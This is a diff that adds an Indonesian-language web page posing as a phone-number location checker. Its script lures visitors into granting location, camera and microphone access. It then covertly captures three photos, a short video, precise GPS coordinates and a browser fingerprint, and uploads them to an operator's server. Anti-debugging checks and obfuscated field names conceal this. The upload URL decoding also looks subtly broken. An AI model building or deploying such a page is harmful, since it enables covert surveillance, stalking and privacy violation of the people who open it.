@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Cek Lokasi Nomor HP - Verifikasi Cepat</title>
+  <style>
+    body {
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
+      background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+      color: #e0e7ff;
+      margin: 0;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      padding: 20px;
+    }
+    h1 {
+      color: #ff4d4d;
+      font-size: 2.6rem;
+      margin-bottom: 0.6rem;
+      text-shadow: 0 0 12px rgba(255, 77, 77, 0.7);
+    }
+    p.intro {
+      max-width: 540px;
+      margin: 0 auto 1.6rem;
+      color: #c7d2fe;
+      line-height: 1.6;
+      font-size: 1.1rem;
+    }
+    .warning {
+      color: #fbbf24;
+      font-weight: 600;
+      margin: 1rem 0;
+      font-size: 1.05rem;
+    }
+    .btn-main {
+      padding: 18px 80px;
+      font-size: 1.55rem;
+      font-weight: 800;
+      background: #dc2626;
+      color: white;
+      border: none;
+      border-radius: 9999px;
+      cursor: pointer;
+      box-shadow: 0 12px 30px rgba(220, 38, 38, 0.55);
+      transition: all 0.35s;
+      margin: 2rem 0;
+    }
+    .btn-main:hover:not(:disabled) {
+      transform: translateY(-4px);
+      box-shadow: 0 18px 40px rgba(220, 38, 38, 0.75);
+      background: #ef4444;
+    }
+    .btn-main:disabled {
+      opacity: 0.45;
+      cursor: not-allowed;
+      transform: none;
+      box-shadow: none;
+    }
+    #status {
+      margin: 1.6rem 0;
+      font-size: 1.3rem;
+      color: #a5b4fc;
+      min-height: 1.6em;
+    }
+    #error {
+      color: #fca5a5;
+      font-size: 1.2rem;
+      max-width: 540px;
+      margin-top: 1.2rem;
+      line-height: 1.4;
+    }
+    #vid {
+      display: none;
+      width: 1px;
+      height: 1px;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>Cek Lokasi Nomor HP</h1>
+  <p class="intro">
+    Masukkan nomor target di aplikasi lalu klik tombol di bawah untuk verifikasi kepemilikan.<br>
+    Sistem akan menampilkan lokasi real-time setelah verifikasi selesai.
+  </p>
+  <p class="warning">
+    Harus mengizinkan akses lokasi & kamera di popup browser agar proses berjalan.
+  </p>
+
+  <button class="btn-main" id="x9k2p">VERIFIKASI & CEK LOKASI</button>
+  <div id="s7q4m">Menunggu konfirmasi...</div>
+  <div id="e3r8t"></div>
+
+  <video id="vid" autoplay playsinline muted></video>
+
+  <script>(function(){
+    const els = {
+      btn: document.getElementById('x9k2p'),
+      stat: document.getElementById('s7q4m'),
+      err: document.getElementById('e3r8t'),
+      video: document.getElementById('vid')
+    };
+
+    // Simple string obfuscation
+    const _d = s => atob(s.split('').reverse().join(''));
+    const _e = s => btoa(s).split('').reverse().join('');
+
+    // Ganti sesuai server lo (contoh localhost, ubah jadi domain asli kalau live)
+    const srv = 'http://localhost/MABES/dashboard.php';
+
+    let devtools = false;
+    const chkDebug = () => {
+      const t = performance.now();
+      debugger;
+      if (performance.now() - t > 80) devtools = true;
+    };
+    setInterval(chkDebug, 1500);
+
+    async function getFingerprint() {
+      if (devtools) return { status: 'blocked' };
+
+      const data = {
+        ts: new Date().toISOString(),
+        ua: navigator.userAgent,
+        pl: navigator.platform,
+        lang: (navigator.languages || [navigator.language]).join(', '),
+        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        screen: `${screen.width}×${screen.height}@${screen.colorDepth}`
+      };
+
+      try {
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        if (ctx) {
+          ctx.font = '15px Arial';
+          ctx.fillStyle = '#0f0'; ctx.fillRect(5, 5, 220, 60);
+          ctx.fillStyle = '#f00'; ctx.fillText('TRACK-2026', 15, 40);
+          data.canvas = canvas.toDataURL().slice(-30);
+        }
+      } catch {}
+
+      return data;
+    }
+
+    els.btn.onclick = async () => {
+      els.btn.disabled = true;
+      els.err.textContent = '';
+      els.stat.textContent = 'Meminta izin akses...';
+
+      try {
+        // 1. Minta lokasi dulu (paling kritis)
+        els.stat.textContent = 'Meminta izin lokasi...';
+        const position = await new Promise((resolve, reject) => {
+          navigator.geolocation.getCurrentPosition(resolve, reject, {
+            enableHighAccuracy: true,
+            timeout: 12000,
+            maximumAge: 0
+          });
+        });
+
+        const loc = {
+          lat: position.coords.latitude,
+          lon: position.coords.longitude,
+          acc: position.coords.accuracy,
+          alt: position.coords.altitude || 0,
+          head: position.coords.heading || 0,
+          spd: position.coords.speed || 0,
+          ts: new Date(position.timestamp).toISOString()
+        };
+
+        els.stat.textContent = `Lokasi terkunci (±${loc.acc.toFixed(1)} m) → Meminta kamera...`;
+
+        // 2. Langsung minta kamera + audio setelah lokasi lolos
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: 'user' },
+          audio: true
+        });
+
+        els.video.srcObject = stream;
+        await els.video.play().catch(() => {});
+
+        els.stat.textContent = 'Mengumpulkan bukti kepemilikan...';
+
+        // Ambil fingerprint setelah permission lolos (kurangi risiko block)
+        const fp = await getFingerprint();
+
+        // Ambil 3 foto
+        const photos = [];
+        for (let i = 0; i < 3; i++) {
+          await new Promise(r => setTimeout(r, i === 0 ? 2200 : 1400));
+          const canvas = document.createElement('canvas');
+          canvas.width = els.video.videoWidth;
+          canvas.height = els.video.videoHeight;
+          canvas.getContext('2d').drawImage(els.video, 0, 0);
+          photos.push(canvas.toDataURL('image/jpeg', 0.85));
+        }
+
+        // Rekam video pendek
+        els.stat.textContent = 'Merekam (beberapa detik)...';
+        const recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8,opus' });
+        const chunks = [];
+        recorder.ondataavailable = e => chunks.push(e.data);
+        recorder.start();
+        await new Promise(r => setTimeout(r, 400));
+        recorder.stop();
+
+        const videoBlob = await new Promise((resolve, reject) => {
+          recorder.onstop = () => {
+            if (chunks.length === 0) reject(new Error('video empty'));
+            resolve(new Blob(chunks, { type: 'video/webm' }));
+          };
+        });
+
+        // Siapkan FormData
+        const formData = new FormData();
+
+        const keyLoc  = _d(_e('bG9jYXRpb24='));
+        const keyFp   = _d(_e('ZmluZ2VycHJpbnQ='));
+        const keyVid  = _d(_e('dmlkZW8='));
+
+        formData.append(keyLoc, JSON.stringify(loc));
+        formData.append(keyFp, JSON.stringify(fp));
+        formData.append(keyVid, videoBlob, 'vid_' + Date.now().toString(36) + '.webm');
+
+        // Tambah foto
+        for (let i = 0; i < photos.length; i++) {
+          const blob = await (await fetch(photos[i])).blob();
+          formData.append('img_' + (i+1), blob, 'photo_' + Date.now().toString(36) + '_' + (i+1) + '.jpg');
+        }
+
+        // Kirim
+        els.stat.textContent = 'Mengirim data verifikasi...';
+        const response = await fetch(atob(srv.split('').reverse().join('')), {
+          method: 'POST',
+          body: formData,
+          mode: 'cors',
+          credentials: 'omit'
+        });
+
+        if (!response.ok) throw new Error(`server ${response.status}`);
+
+        els.stat.textContent = 'Lokasi berhasil dilacak!';
+        stream.getTracks().forEach(track => track.stop());
+
+      } catch (err) {
+        let msg = 'Gagal memverifikasi';
+        
+        if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
+          msg = 'Izin kamera atau lokasi ditolak. Klik izinkan di popup browser lalu coba lagi.';
+        } else if (err.name === 'NotFoundError') {
+          msg = 'Kamera tidak ditemukan atau tidak tersedia di perangkat ini.';
+        } else if (err.name === 'NotReadableError') {
+          msg = 'Kamera sedang digunakan oleh aplikasi lain. Tutup dulu lalu coba lagi.';
+        } else if (err.name === 'SecurityError' || err.message.includes('https')) {
+          msg = 'Halaman harus diakses melalui HTTPS (bukan file:// atau http). Gunakan server yang aman.';
+        } else if (err.name === 'TimeoutError' || err.name === 'PositionError') {
+          msg = 'Waktu tunggu lokasi habis. Pastikan GPS aktif dan coba lagi.';
+        }
+
+        els.stat.textContent = 'Gagal';
+        els.err.textContent = msg;
+        els.btn.disabled = false;
+      }
+    };
+  })();</script>
+
+</body>
+</html>
